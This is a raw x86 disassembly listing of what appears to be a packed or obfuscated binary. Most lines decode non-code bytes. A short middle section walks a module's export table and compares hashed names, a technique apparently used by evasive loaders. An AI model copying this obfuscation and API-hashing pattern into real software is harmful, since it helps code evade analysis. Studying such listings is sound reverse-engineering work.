  40f292:	xchg   ecx,eax
  40f293:	lds    edx,FWORD PTR [esi-0x7a55d062]
  40f299:	xchg   ebp,eax
  40f29a:	repnz (bad) 
  40f29c:	and    al,0x3c
  40f29e:	pop    eax
  40f29f:	imul   esi,DWORD PTR [edx],0xfffffff4
  40f2a2:	jp     0x40f2ad
  40f2a4:	pop    ds
  40f2a5:	mov    ds:0xdfc046aa,al
  40f2aa:	pop    esi
  40f2ab:	adc    BYTE PTR [edx-0x460f2fac],ch
  40f2b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2b2:	cmp    edx,DWORD PTR [ecx+0x47]
  40f2b5:	xchg   edi,eax
  40f2b6:	sbb    BYTE PTR [ebp+0x33],bh
  40f2b9:	in     al,0xe8
  40f2bb:	dec    ecx
  40f2bc:	(bad)  
  40f2be:	shl    BYTE PTR [ebp-0x16271f3c],1
  40f2c4:	mov    DWORD PTR [esi+0x6d],ebx
  40f2c7:	push   ecx
  40f2c8:	loopne 0x40f328
  40f2ca:	mov    ecx,0x34cc7f0e
  40f2cf:	daa    
  40f2d0:	test   eax,esp
  40f2d2:	(bad)  
  40f2d3:	shl    BYTE PTR ds:0x12c32aa3,1
  40f2d9:	add    eax,ebp
  40f2db:	stos   DWORD PTR es:[edi],eax
  40f2dc:	or     eax,0xdb31c397
  40f2e1:	xchg   edi,eax
  40f2e2:	sub    DWORD PTR ds:0xf7938196,edx
  40f2e8:	mov    WORD PTR [ecx*8+0x108d1722],?
  40f2ef:	push   eax
  40f2f0:	rol    cl,0x21
  40f2f3:	inc    esp
  40f2f4:	je     0x40f2ae
  40f2f6:	push   ecx
  40f2f7:	and    DWORD PTR [edi+0x6313e2ba],esi
  40f2fd:	mov    gs,esi
  40f2ff:	cld    
  40f300:	dec    edx
  40f301:	sti    
  40f302:	sbb    ecx,DWORD PTR [esi-0x3b]
  40f305:	addr16 xchg esp,eax
  40f307:	dec    esi
  40f308:	sub    al,0x8
  40f30a:	pop    edi
  40f30b:	dec    edi
  40f30c:	push   ebx
  40f30d:	(bad)  
  40f30e:	idiv   BYTE PTR [ecx+ebp*2-0x2b]
  40f312:	sub    al,0xff
  40f314:	mov    bl,0xe7
  40f316:	pusha  
  40f317:	out    0xed,al
  40f319:	add    dh,BYTE PTR [eax]
  40f31b:	jno    0x40f33f
  40f31d:	mov    ebp,0x8cba5635
  40f322:	nop
  40f323:	out    0x6,al
  40f325:	and    BYTE PTR [ecx+0x20],dh
  40f328:	pop    ds
  40f329:	add    BYTE PTR [eax+0x41],al
  40f32c:	scas   al,BYTE PTR es:[edi]
  40f32d:	xor    BYTE PTR [ebx+0x41],0x13
  40f331:	imul   ebx,DWORD PTR ds:[ecx+0x10],0x1ca2c86f
  40f339:	or     DWORD PTR [ebx],0x67
  40f33c:	mov    ch,0xd7
  40f33e:	push   0x14
  40f340:	dec    ebx
  40f341:	int    0x2f
  40f343:	pop    esi
  40f344:	cmp    ecx,edx
  40f346:	in     eax,0x9d
  40f348:	cmp    bh,al
  40f34a:	sbb    BYTE PTR [ebp+0xe],dl
  40f34d:	sub    al,0x46
  40f34f:	cmp    cl,BYTE PTR [esi]
  40f351:	xchg   esi,eax
  40f352:	daa    
  40f353:	mov    bl,0x57
  40f355:	in     al,dx
  40f356:	mov    ebx,0xbe6a68d6
  40f35b:	xchg   edx,eax
  40f35c:	push   ecx
  40f35d:	fistp  QWORD PTR [ebp+0x691e97b4]
  40f363:	sub    bh,0x5e
  40f366:	jb     0x40f2f8
  40f368:	cld    
  40f369:	pop    esi
  40f36a:	add    al,0x55
  40f36c:	(bad)  
  40f36d:	ds popf 
  40f36f:	shr    dl,0x10
  40f372:	adc    eax,edx
  40f374:	sub    DWORD PTR [edi+0x5b],edi
  40f377:	adc    DWORD PTR [ebp+0x5e],ebx
  40f37a:	or     esi,ecx
  40f37c:	fst    QWORD PTR [ebx-0x19dedd02]
  40f382:	out    dx,eax
  40f383:	and    eax,0xa8c08ef5
  40f388:	mov    ds:0x3c5f159b,al
  40f38d:	stc    
  40f38e:	rcr    BYTE PTR [esi+0x4c],0xea
  40f392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f393:	ror    BYTE PTR [edx-0x5a],0x7d
  40f397:	push   ss
  40f398:	inc    esp
  40f399:	cld    
  40f39a:	inc    esp
  40f39b:	sub    eax,0x6a81a055
  40f3a0:	in     eax,dx
  40f3a1:	xlat   BYTE PTR ds:[ebx]
  40f3a2:	add    esi,DWORD PTR [edx+ebp*8]
  40f3a5:	sub    eax,0xf17e2fbc
  40f3aa:	cmp    edi,DWORD PTR [eax]
  40f3ac:	xor    bh,BYTE PTR [ebx+0xf0c316c]
  40f3b2:	or     eax,0xa526c4ab
  40f3b7:	and    al,0x1a
  40f3b9:	and    ebx,eax
  40f3bb:	pop    edx
  40f3bc:	fild   QWORD PTR [ebx-0x4]
  40f3bf:	push   edx
  40f3c0:	ror    DWORD PTR [ebp+0x2e],1
  40f3c3:	push   0x3fc6828b
  40f3c8:	in     al,dx
  40f3c9:	pop    ss
  40f3ca:	push   ecx
  40f3cb:	sar    ebx,1
  40f3cd:	loopne 0x40f37f
  40f3cf:	in     al,dx
  40f3d0:	pusha  
  40f3d1:	dec    edx
  40f3d2:	js     0x40f3c7
  40f3d4:	mov    edi,0x330ca8ce
  40f3d9:	stos   DWORD PTR es:[edi],eax
  40f3da:	push   ebx
  40f3db:	inc    esp
  40f3dc:	jns    0x40f402
  40f3de:	dec    ecx
  40f3df:	retf   0xdbe4
  40f3e2:	icebp  
  40f3e3:	mov    BYTE PTR [ebx],0x51
  40f3e6:	mov    al,al
  40f3e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3e9:	(bad)  
  40f3eb:	mov    ebp,0x3be804c5
  40f3f0:	lahf   
  40f3f1:	cmp    edi,DWORD PTR ds:0x1cc2e75c
  40f3f7:	es xchg ebp,eax
  40f3f9:	lods   al,BYTE PTR ds:[esi]
  40f3fa:	jnp    0x40f3dd
  40f3fc:	fisttp WORD PTR [edx+edi*4-0x2]
  40f400:	aad    0x6
  40f402:	mov    dl,0x51
  40f404:	cmp    DWORD PTR [edx],esp
  40f406:	dec    ecx
  40f407:	(bad)  
  40f408:	int    0x34
  40f40a:	cli    
  40f40b:	nop
  40f40c:	lahf   
  40f40d:	xchg   edi,eax
  40f40e:	shl    BYTE PTR [edx-0x24],1
  40f411:	pushf  
  40f412:	jle    0x40f48e
  40f414:	inc    ebp
  40f415:	aas    
  40f416:	leave  
  40f417:	xchg   ecx,eax
  40f418:	mov    ebp,0xa15bd1ee
  40f41d:	sbb    edx,DWORD PTR [edi+edx*4+0x29]
  40f421:	mov    bl,0x27
  40f423:	and    al,0xf7
  40f425:	sbb    bl,BYTE PTR [edx]
  40f427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f428:	hlt    
  40f429:	out    dx,al
  40f42a:	into   
  40f42b:	xchg   BYTE PTR [ecx+0x7959c232],bl
  40f431:	enter  0xbd26,0x2a
  40f435:	mov    ecx,0xde820a18
  40f43b:	daa    
  40f43c:	xchg   esp,eax
  40f43d:	and    edi,DWORD PTR [ebp+0x222198e9]
  40f443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f444:	outs   dx,DWORD PTR ds:[esi]
  40f445:	push   esi
  40f446:	push   cs
  40f447:	sub    ah,BYTE PTR [ebp-0x80]
  40f44a:	lods   al,BYTE PTR ds:[esi]
  40f44b:	push   ecx
  40f44c:	mov    dl,0x6c
  40f44e:	sub    dl,ch
  40f450:	dec    edx
  40f451:	sub    eax,0x87ee8cbb
  40f456:	out    dx,eax
  40f457:	add    dx,di
  40f45a:	adc    edi,edx
  40f45c:	xor    DWORD PTR [ecx-0x43a07682],edi
  40f462:	out    dx,eax
  40f463:	mov    bh,0x6d
  40f465:	mov    ds:0x4a14ced,eax
  40f46a:	(bad)  
  40f46b:	jle    0x40f48a
  40f46d:	imul   ecx,DWORD PTR [edi+0x68],0x408b90db
  40f474:	xchg   esp,eax
  40f475:	or     eax,0x3a4a671d
  40f47a:	in     eax,0xd7
  40f47c:	das    
  40f47d:	cmp    DWORD PTR [ebx],ebx
  40f47f:	xor    BYTE PTR [edi],dh
  40f481:	and    dh,dl
  40f483:	mov    al,0x35
  40f485:	pop    ss
  40f486:	push   ebx
  40f487:	cmp    BYTE PTR [edx-0x79840b0a],ah
  40f48d:	or     eax,0xec4589e9
  40f492:	mov    DWORD PTR ds:0x42a2aa,0x1f
  40f49c:	cmp    DWORD PTR ds:0x42a2aa,0x0
  40f4a3:	je     0x40f4e0
  40f4a9:	cmp    DWORD PTR ds:0x42a2aa,0x2b
  40f4b0:	jg     0x40f4e0
  40f4b6:	jmp    0x40f4ce
  40f4bb:	push   DWORD PTR [ebp-0x20]
  40f4be:	push   0x68ce
  40f4c3:	push   0x13fc
  40f4c8:	call   DWORD PTR ds:0x42a40e
  40f4ce:	mov    ecx,DWORD PTR ds:0x42a2aa
  40f4d4:	dec    ecx
  40f4d5:	mov    DWORD PTR ds:0x42a2aa,ecx
  40f4db:	jmp    0x40f49c
  40f4e0:	mov    eax,DWORD PTR [ebp-0x4]
  40f4e3:	mov    ecx,DWORD PTR ds:0x42a2ea
  40f4e9:	adc    ecx,DWORD PTR ds:0x42a2fe
  40f4ef:	mov    DWORD PTR ds:0x42a2ea,ecx
  40f4f5:	mov    ecx,DWORD PTR [ebp-0x14]
  40f4f8:	sub    DWORD PTR ds:0x42a256,0x42a2c6
  40f502:	xor    eax,esi
  40f504:	xor    DWORD PTR ds:0x42a27a,0x42a276
  40f50e:	add    eax,edi
  40f510:	mov    DWORD PTR ds:0x42a26a,0x50b9
  40f51a:	cmp    ecx,eax
  40f51c:	je     0x413d1d
  40f522:	xor    ecx,DWORD PTR ds:0x42a2ee
  40f528:	mov    eax,DWORD PTR [ebp-0x14]
  40f52b:	xor    ecx,0x6e1c
  40f531:	mov    eax,DWORD PTR [eax+0x18]
  40f534:	mov    DWORD PTR [ebp-0x24],eax
  40f537:	mov    eax,DWORD PTR [ebp-0x14]
  40f53a:	xor    ecx,ecx
  40f53c:	or     ecx,DWORD PTR ds:0x42a29e
  40f542:	xor    DWORD PTR ds:0x42a2aa,ecx
  40f548:	mov    ecx,DWORD PTR [ebp+0x8]
  40f54b:	xor    DWORD PTR ds:0x42a2e6,0x42a2f6
  40f555:	add    ecx,DWORD PTR [eax+0x20]
  40f558:	mov    DWORD PTR [ebp-0x2c],ecx
  40f55b:	mov    eax,ds:0x42a2d6
  40f560:	and    DWORD PTR ds:0x42a29e,eax
  40f566:	mov    eax,DWORD PTR [ebp-0x14]
  40f569:	mov    ecx,DWORD PTR [ebp+0x8]
  40f56c:	adc    DWORD PTR ds:0x42a2c2,0xc51
  40f576:	add    ecx,DWORD PTR [eax+0x24]
  40f579:	xor    DWORD PTR ds:0x42a28a,0x42a29e
  40f583:	mov    DWORD PTR [ebp-0x34],ecx
  40f586:	mov    eax,DWORD PTR [ebp-0x14]
  40f589:	mov    ecx,DWORD PTR [ebp+0x8]
  40f58c:	add    ecx,DWORD PTR [eax+0x1c]
  40f58f:	mov    DWORD PTR [ebp-0x14],ecx
  40f592:	jmp    0x411969
  40f597:	mov    eax,DWORD PTR [ebp-0x2c]
  40f59a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f59d:	add    ecx,DWORD PTR [eax+ebx*4]
  40f5a0:	mov    DWORD PTR [ebp-0x28],ecx
  40f5a3:	mov    eax,DWORD PTR [ebp-0x4]
  40f5a6:	mov    ecx,DWORD PTR [ebp-0x28]
  40f5a9:	xor    eax,esi
  40f5ab:	add    eax,edi
  40f5ad:	cmp    ecx,eax
  40f5af:	je     0x411969
  40f5b5:	jmp    0x41195a
  40f5ba:	mov    eax,DWORD PTR [ebp-0x4]
  40f5bd:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5c0:	xor    eax,esi
  40f5c2:	add    eax,edi
  40f5c4:	cmp    ecx,eax
  40f5c6:	mov    eax,DWORD PTR [ebp-0x4]
  40f5c9:	je     0x413d20
  40f5cf:	mov    ecx,DWORD PTR [ebp-0x30]
  40f5d2:	xor    eax,esi
  40f5d4:	add    eax,edi
  40f5d6:	cmp    ecx,eax
  40f5d8:	je     0x413d29
  40f5de:	jmp    0x41195a
  40f5e3:	or     al,BYTE PTR es:[edx-0x17]
  40f5e7:	inc    edx
  40f5e8:	mov    eax,ds:0x1d8d8286
  40f5ed:	ins    DWORD PTR es:[edi],dx
  40f5ee:	mov    al,ds:0xecd25bc2
  40f5f3:	jno    0x40f59d
  40f5f5:	add    DWORD PTR [ebx-0x7c7ca1de],0xffffffe7
  40f5fc:	mov    al,0x4
  40f5fe:	mov    esi,0x4a0e97e2
  40f603:	sar    BYTE PTR [ebx],cl
  40f605:	or     ebp,DWORD PTR [edi+0x3]
  40f608:	or     esi,DWORD PTR [esi+0x13]
  40f60b:	or     eax,0xec7150e2
  40f610:	mov    ah,BYTE PTR [ebx-0x2e]
  40f613:	daa    
  40f614:	popa   
  40f615:	lea    esi,[edx]
  40f617:	xor    ebp,DWORD PTR [edx+0x6702c67a]
  40f61d:	pop    ebx
  40f61e:	ror    dl,cl
  40f620:	xchg   esp,eax
  40f621:	or     eax,0xb8caef4c
  40f626:	push   cs
  40f627:	enter  0x3165,0xcf
  40f62b:	jae    0x40f643
  40f62d:	adc    BYTE PTR [ebx-0x9],0x80
  40f631:	xor    edi,DWORD PTR [edi-0x39c171b7]
  40f637:	mov    ds:0x9bcdd31e,eax
  40f63c:	jmp    0x7a16:0x94fe2326
  40f643:	pusha  
  40f644:	repz jl 0x40f67e
  40f647:	rol    DWORD PTR [eax+0x47],0x6d
  40f64b:	(bad)  
  40f64d:	mov    ebx,0x405359ab
  40f652:	add    eax,DWORD PTR [ebx+0x2e]
  40f655:	cli    
  40f656:	ins    DWORD PTR es:[edi],dx
  40f657:	pusha  
  40f658:	dec    ebx
  40f659:	fmul   QWORD PTR [ecx+0x9a1f637]
  40f65f:	xchg   esi,eax
  40f660:	mov    ch,0xcb
  40f662:	xor    edi,DWORD PTR [ecx]
  40f664:	aam    0xec
  40f666:	mov    ds:0x7c5e111,eax
  40f66b:	push   0x82951b8c
  40f670:	(bad)  
  40f671:	mov    bl,0xc6
  40f673:	mov    cl,0x1c
  40f675:	(bad)  
  40f676:	and    dl,BYTE PTR [eax-0x21460fac]
  40f67c:	jns    0x40f647
  40f67e:	lods   al,BYTE PTR ds:[esi]
  40f67f:	inc    edi
  40f680:	cld    
  40f681:	ja     0x40f608
  40f683:	mov    cs,ebp
  40f685:	fwait
  40f686:	dec    esp
  40f687:	cmp    bh,BYTE PTR ds:0xb5856b33
  40f68d:	addr16 in eax,0x55
  40f690:	sbb    eax,0x48e36de5
  40f695:	(bad)  
  40f697:	push   edi
  40f698:	stos   DWORD PTR es:[edi],eax
  40f699:	sub    edi,DWORD PTR [ecx+ebx*1-0x33]
  40f69d:	(bad)  
  40f69e:	mov    ebp,0xbf67ca49
  40f6a3:	xor    al,0x27
  40f6a5:	sbb    al,0xac
  40f6a7:	and    al,0x80
  40f6a9:	fcmove st,st(0)
  40f6ab:	inc    esi
  40f6ac:	fwait
  40f6ad:	aas    
  40f6ae:	mov    bh,0x86
  40f6b0:	fistp  QWORD PTR [ebx]
  40f6b2:	pop    ecx
  40f6b3:	mov    ds:0x5cbf20a3,eax
  40f6b8:	sbb    ecx,DWORD PTR [edi]
  40f6ba:	mov    ecx,0x1856f212
  40f6bf:	and    al,0x51
  40f6c1:	in     eax,dx
  40f6c2:	ret    
  40f6c3:	pop    esp
  40f6c4:	cmp    DWORD PTR [edi-0x37],esp
  40f6c7:	std    
  40f6c8:	inc    esp
  40f6c9:	gs add eax,0x9752841f
  40f6cf:	xor    al,0x2b
  40f6d1:	xchg   esp,eax
  40f6d2:	sahf   
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	sub    DWORD PTR [esi+eiz*4],ebx
  40f6d7:	(bad)  
  40f6d8:	jge    0x40f6bd
  40f6da:	out    dx,eax
  40f6db:	lods   al,BYTE PTR ds:[esi]
  40f6dc:	call   0xdcba4112
  40f6e1:	xor    DWORD PTR [ecx+0x30e79c15],ebp
  40f6e7:	dec    esi
  40f6e8:	or     eax,ecx
  40f6ea:	ret    
  40f6eb:	in     al,dx
  40f6ec:	sbb    DWORD PTR [ebp-0x46f5444c],ecx
  40f6f2:	out    0x7,eax
  40f6f4:	loop   0x40f740
  40f6f6:	ror    BYTE PTR [ecx-0x7],0x90
  40f6fa:	xor    esi,esi
  40f6fc:	pop    edx
  40f6fd:	mov    al,0x79
  40f6ff:	in     al,dx
  40f700:	mov    bh,BYTE PTR [edx-0x377e1f9f]
  40f706:	jmp    0x20f4:0xe6766b8c
  40f70d:	not    DWORD PTR ds:[edi-0x1d3f5b9a]
  40f714:	lock mov ebx,0xff7fa2d9
  40f71a:	push   ss
  40f71b:	loop   0x40f777
  40f71d:	cdq    
  40f71e:	xor    eax,0xe030262d
  40f723:	gs push edi
  40f725:	or     BYTE PTR [esi],dh
  40f727:	push   0xd207ac4a
  40f72c:	xor    dh,dl
  40f72e:	pop    edx
  40f72f:	test   BYTE PTR [esi+ebx*4-0x66],bl
  40f733:	mov    ecx,0x3b1fad5c
  40f738:	call   0x96f2:0xfbd12347
  40f73f:	dec    ecx
  40f740:	ins    BYTE PTR es:[edi],dx
  40f741:	mov    bl,0xc6
  40f743:	outs   dx,DWORD PTR ds:[esi]
  40f744:	cdq    
  40f745:	mov    eax,ds:0x5ea2c694
  40f74a:	inc    ebx
  40f74b:	adc    al,cl
  40f74d:	ja     0x40f6f3
  40f74f:	push   0xd66bc69d
  40f754:	(bad)  
  40f755:	jns    0x40f779
  40f757:	iret   
  40f758:	outs   dx,DWORD PTR ds:[esi]
  40f759:	cmp    eax,0xa145a328
  40f75e:	xchg   esp,eax
  40f75f:	enter  0x36e4,0x8
  40f763:	sahf   
  40f764:	std    
  40f765:	fldenv [ecx]
  40f767:	jmp    0x40f7ba
  40f769:	push   es
  40f76a:	das    
  40f76b:	mov    eax,ds:0x10983998
  40f770:	cwde   
  40f771:	je     0x40f7dd
  40f773:	es aas 
  40f775:	mov    edi,0x2b62e258
  40f77a:	push   ds
  40f77b:	les    ebp,FWORD PTR [edx+0x31]
  40f77e:	push   cs
  40f77f:	adc    DWORD PTR [eax+0x77dbe85b],0x4a
  40f786:	push   es
  40f787:	mov    ds:0xe366b397,al
  40f78c:	fistp  QWORD PTR [ecx]
  40f78e:	ss jmp 0xf323:0xfa17494b
  40f796:	or     al,0xc8
  40f798:	sar    DWORD PTR [ecx+eax*4+0x103f8441],cl
  40f79f:	(bad)  
  40f7a1:	cmp    al,0xe3
  40f7a3:	(bad)  
  40f7a4:	mov    edi,0xe7830747
  40f7a9:	jmp    0xe8edf3d8
  40f7ae:	xchg   DWORD PTR [edi],eax
  40f7b0:	push   0x565a67fd
  40f7b5:	loopne 0x40f7aa
  40f7b7:	jae    0x40f77f
  40f7b9:	mov    esp,0x851f42b1
  40f7be:	pop    ecx
  40f7bf:	xor    ch,ch
  40f7c1:	push   0x8f22dc20
  40f7c6:	push   cs
  40f7c7:	dec    ebx
  40f7c8:	fsubr  st(5),st
  40f7ca:	fcom   QWORD PTR [esi+0x3e]
  40f7cd:	mov    cl,0x6f
  40f7cf:	mov    WORD PTR [ebp-0x40],ss
  40f7d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7d3:	jmp    0xa19e5a45
  40f7d8:	outs   dx,BYTE PTR ds:[esi]
  40f7d9:	loopne 0x40f7ef
  40f7db:	push   esp
  40f7dc:	cmp    al,0xb8
  40f7de:	jno    0x40f7c3
  40f7e0:	or     eax,0xcddbc8b6
  40f7e5:	xor    al,0x86
  40f7e7:	vcvtsd2ss xmm1,xmm7,xmm1
  40f7eb:	sub    al,0x6c
  40f7ed:	gs aam 0x7
  40f7f0:	push   ebp
  40f7f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7f2:	mov    bl,0x6c
  40f7f4:	ja     0x40f7f0
  40f7f6:	pop    ebp
  40f7f7:	gs cwde 
  40f7f9:	fwait
  40f7fa:	cwde   
  40f7fb:	inc    edi
  40f7fc:	int3   
  40f7fd:	sub    ch,BYTE PTR [ebp+eax*1+0x21]
  40f801:	inc    ebx
  40f802:	adc    al,0x65
  40f804:	push   ecx
  40f805:	sub    eax,0x2d39c0e6
  40f80a:	nop
  40f80b:	and    ecx,DWORD PTR [edx+0x6e471ea8]
  40f811:	in     al,0xeb
  40f813:	sub    eax,0xd196bf87
  40f818:	and    al,0x67
  40f81a:	in     al,0xf6
  40f81c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f81d:	dec    edi
  40f81e:	and    eax,0xb8f8e7c1
  40f823:	ds or  eax,0xfffffffa
  40f827:	mov    dl,0xcd
  40f829:	aad    0x12
  40f82b:	cmp    dh,BYTE PTR [esi+ebx*4]
  40f82e:	sub    dh,bh
  40f830:	fistp  QWORD PTR [ebx+0x4e6e5fbb]
  40f836:	mov    ss,esp
  40f838:	test   edx,edi
  40f83a:	push   ebx
  40f83b:	ins    BYTE PTR es:[edi],dx
  40f83c:	clc    
  40f83d:	xor    edx,DWORD PTR [ebp-0x1e]
  40f840:	hlt    
  40f841:	(bad)  
  40f842:	add    al,0x80
  40f844:	pop    esi
  40f845:	xor    eax,0x1654a3c0
  40f84a:	xchg   edi,eax
  40f84b:	xor    BYTE PTR [ecx-0x4ade05df],dl
  40f851:	fistp  WORD PTR [ecx]
  40f853:	push   ebx
  40f854:	or     DWORD PTR [ebp-0x58da1df2],ecx
  40f85a:	mov    edi,fs
  40f85c:	test   bh,0xc8
  40f85f:	icebp  
  40f860:	mov    al,ah
  40f862:	and    eax,0x406af126
  40f867:	xchg   BYTE PTR [ecx-0x7cf262bf],ah
  40f86d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f86e:	les    ecx,FWORD PTR [edx+edx*2]
  40f871:	mov    DWORD PTR ds:0x2642502f,ebp
  40f877:	jmp    0xd7a1ad74
  40f87c:	cmp    BYTE PTR [ecx],0x23
  40f87f:	sbb    DWORD PTR [eax+0x79],eax
  40f882:	xchg   edx,eax
  40f883:	imul   ebp,DWORD PTR [ebx],0x57
  40f886:	mov    ebp,0x1b85c6b8
  40f88b:	mov    bl,0xd9
  40f88d:	mov    ebx,0xd91edbfe
  40f892:	mov    dl,0x80
  40f894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f895:	inc    edx
  40f896:	fcomp  QWORD PTR [ebx-0x4420413a]
  40f89c:	aas    
  40f89d:	sbb    dl,0xa3
  40f8a0:	loop   0x40f8f9
  40f8a2:	into   
  40f8a3:	jb     0x40f826
  40f8a5:	sub    eax,0xbd761619
  40f8aa:	jo     0x40f8e4
  40f8ac:	add    BYTE PTR [edx+0x6c],bl
  40f8af:	jo     0x40f86c
  40f8b1:	ss int 0x49
  40f8b4:	inc    edx
  40f8b5:	mov    ebp,0xccd831b3
  40f8ba:	mov    ch,0x41
  40f8bc:	jp     0x40f8db
  40f8be:	(bad)  
  40f8bf:	xchg   esp,eax
  40f8c0:	xchg   DWORD PTR [ebx+0x55],ebx
  40f8c3:	push   esi
  40f8c4:	les    ebp,FWORD PTR [ebx]
  40f8c6:	ins    BYTE PTR es:[edi],dx
  40f8c7:	push   ss
  40f8c8:	xchg   edx,eax
  40f8c9:	in     al,0xb5
  40f8cb:	inc    ebp
  40f8cc:	inc    esi
  40f8cd:	mov    ebx,0xabf7ddd8
  40f8d2:	dec    esp
  40f8d3:	int3   
  40f8d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8d5:	sbb    al,0x6d
  40f8d7:	adc    eax,0x1d131733
  40f8dc:	sbb    BYTE PTR [edi+0x33c85318],dl
  40f8e2:	jl     0x40f884
  40f8e4:	or     BYTE PTR [esi+0x6e],0xae
  40f8e8:	test   eax,0x41ad7559
  40f8ed:	mul    ebp
  40f8ef:	dec    eax
  40f8f0:	stc    
  40f8f1:	adc    BYTE PTR [ecx],bh
  40f8f3:	add    ecx,ebx
  40f8f5:	mov    ds:0xa5acb045,al
  40f8fa:	scas   eax,DWORD PTR es:[edi]
  40f8fb:	adc    BYTE PTR [ecx-0x44],cl
  40f8fe:	mov    ecx,DWORD PTR [eax]
  40f900:	jecxz  0x40f8e1
  40f902:	inc    ecx
  40f903:	adc    cl,0xd1
  40f906:	call   0xded3d927
  40f90b:	inc    eax
  40f90c:	sahf   
  40f90d:	daa    
  40f90e:	(bad)  
  40f90f:	shr    edi,0x9d
  40f912:	fmul   DWORD PTR [ebx+0x407be6fe]
  40f918:	mov    dl,0x71
  40f91a:	mov    cl,0x2e
  40f91c:	bound  edi,QWORD PTR [esi]
  40f91e:	js     0x40f920
  40f920:	les    esi,FWORD PTR [eax-0x63ba5bdc]
  40f926:	dec    ebx
  40f927:	inc    eax
  40f928:	fild   DWORD PTR [ecx+eiz*8-0x728ac1ae]
  40f92f:	sbb    ebp,edx
  40f931:	cmp    eax,0x3b48a4c2
  40f936:	sbb    al,0x9a
  40f938:	in     eax,dx
  40f939:	or     DWORD PTR [esp+edx*2+0x18],ecx
  40f93d:	cmp    DWORD PTR [ecx+0x2c58684f],eax
  40f943:	iret   
  40f944:	mov    dh,0x42
  40f946:	xor    DWORD PTR [ebx+0x754aa09a],eax
  40f94c:	mov    ds:0xc92bf28c,eax
  40f951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f952:	jae    0x40f99b
  40f954:	lods   al,BYTE PTR ds:[esi]
  40f955:	ss mov eax,0x2ded85a0
  40f95b:	xchg   DWORD PTR [eax-0x7032bbf1],edi
  40f961:	mov    es,WORD PTR [ecx]
  40f963:	clc    
  40f964:	cmp    bl,BYTE PTR [edx+0x67]
  40f967:	cmc    
  40f968:	inc    ecx
  40f969:	hlt    
  40f96a:	jg     0x40f9dd
  40f96c:	jmp    0x65ee:0x2abf3c9
  40f973:	mov    al,BYTE PTR [esi+edi*1+0x18]
  40f977:	and    DWORD PTR [ebp+0x7c],esp
  40f97a:	mov    WORD PTR [ebx-0x1d],ss
  40f97d:	out    dx,eax
  40f97e:	sbb    bp,WORD PTR [edi+0x62]
  40f982:	sub    DWORD PTR [edi+ebx*2-0x491963b7],ecx
  40f989:	pop    esi
  40f98a:	mov    cl,0x8f
  40f98c:	idiv   bh
  40f98e:	in     al,dx
  40f98f:	mov    dh,0xad
  40f991:	outs   dx,BYTE PTR ds:[esi]
  40f992:	pusha  
  40f993:	mov    cl,0xa6
  40f995:	xchg   DWORD PTR [ebx+0x3bccc777],esp
  40f99b:	xchg   ebp,eax
  40f99c:	ds sbb eax,0x89256c5e
  40f9a2:	pusha  
  40f9a3:	cmc    
  40f9a4:	jecxz  0x40f984
  40f9a6:	adc    eax,0xcc254270
  40f9ab:	in     eax,dx
  40f9ac:	pushf  
  40f9ad:	mov    dh,dh
  40f9af:	cs push es
  40f9b1:	push   ds
  40f9b2:	dec    DWORD PTR [edx+0x4e0a62d0]
  40f9b8:	xor    esi,edi
  40f9ba:	out    dx,al
  40f9bb:	xchg   ecx,eax
  40f9bc:	and    al,0x2f
  40f9be:	xor    BYTE PTR [edi-0x5f],bh
  40f9c1:	sub    eax,0xf698fb8b
  40f9c6:	push   ecx
  40f9c7:	xchg   ebp,eax
  40f9c8:	mov    esi,0x92b44468
  40f9cd:	inc    ebp
  40f9ce:	dec    eax
  40f9cf:	leave  
  40f9d0:	add    edi,0x7f
  40f9d3:	cmp    edx,esp
  40f9d5:	in     al,dx
  40f9d6:	outs   dx,BYTE PTR ds:[esi]
  40f9d7:	pop    ss
  40f9d8:	jle    0x40f9d6
  40f9da:	sub    esp,DWORD PTR [ebp+0x7009b21d]
  40f9e0:	mov    ebp,0x4d60ca7
  40f9e5:	cmc    
  40f9e6:	in     eax,dx
  40f9e7:	dec    eax
  40f9e8:	add    ecx,esi
  40f9ea:	jmp    0xcec5:0x2af4eb1
  40f9f1:	inc    ebp
  40f9f2:	cld    
  40f9f3:	push   ds
  40f9f4:	imul   ebp,DWORD PTR [ecx-0x43],0xffffffb1
  40f9f8:	pop    edi
  40f9f9:	stos   BYTE PTR es:[edi],al
  40f9fa:	cdq    
  40f9fb:	jl     0x40fa1b
  40f9fd:	add    edi,DWORD PTR [ecx+0x652b8796]
  40fa03:	ds stos BYTE PTR es:[edi],al
  40fa05:	imul   esi,DWORD PTR [ebx],0x5c
  40fa08:	sub    DWORD PTR [eax],ebp
  40fa0a:	jns    0x40f9b5
  40fa0c:	jmp    0x40fa06
  40fa0e:	pop    ebp
  40fa0f:	sub    eax,0xf678179f
  40fa14:	aas    
  40fa15:	jnp    0x40f9a0
  40fa17:	dec    esp
  40fa18:	add    BYTE PTR [eax],0x8a
  40fa1b:	pop    esi
  40fa1c:	ret    0x54bb
  40fa1f:	adc    bl,BYTE PTR [eax+0x55]
  40fa22:	lock std 
  40fa24:	adc    ebx,ebx
  40fa26:	stos   DWORD PTR es:[edi],eax
  40fa27:	fisttp DWORD PTR [ebx]
  40fa29:	inc    ebp
  40fa2a:	out    0x91,al
  40fa2c:	aas    
  40fa2d:	cld    
  40fa2e:	scas   al,BYTE PTR es:[edi]
  40fa2f:	jge    0x40f9d3
  40fa31:	or     dl,BYTE PTR [ecx]
  40fa33:	fwait
  40fa34:	adc    ecx,DWORD PTR [edx-0x15]
  40fa37:	add    ah,BYTE PTR [edi+0x2a7c0f7]
  40fa3d:	pop    ss
  40fa3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa3f:	jo     0x40fa2f
